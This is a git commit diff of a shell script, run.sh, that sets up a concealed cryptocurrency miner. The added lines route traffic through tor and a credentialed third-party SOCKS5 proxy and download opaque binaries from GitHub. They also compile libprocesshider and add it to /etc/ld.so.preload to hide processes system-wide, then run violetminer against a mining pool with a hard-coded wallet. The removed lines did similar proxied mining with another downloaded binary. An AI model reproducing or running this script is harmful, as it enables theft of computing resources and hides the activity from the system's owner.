6a95dc9012b6ce9035450866f85be3ae3e8998c8
adisubarja <92545387+adisubarja@users.noreply.github.com>
2022-08-18 20:41:15 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,51 @@
-#!/bin/bash
-apt-get update
-apt install screen -y
-wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
-chmod +x yui
-timeout 15m ./yui -a yescryptr16  -o stratum+tcp://stratum-eu.rplant.xyz:7055 -u qayuTRMFNfMHBRe6FMPWdhYirzeifSo7cU.RX --proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
-rm -rf yui
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+apt update
+
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = sg-socks5.woiden.net:8080
+socks5_username = woiden_sairinjitu
+socks5_password = 12345
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+
+
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+
+./graftcp/graftcp wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv1bEDCWed2DJYzEwfmUAdEyT3QHf3TwvE2odPufw8LdCVbKeBB1gfXYmM8FknQ8nkQ796g2t2MqweQUomiH1G2uu85y14so --password BULUS --algorithm chukwa/wrkz
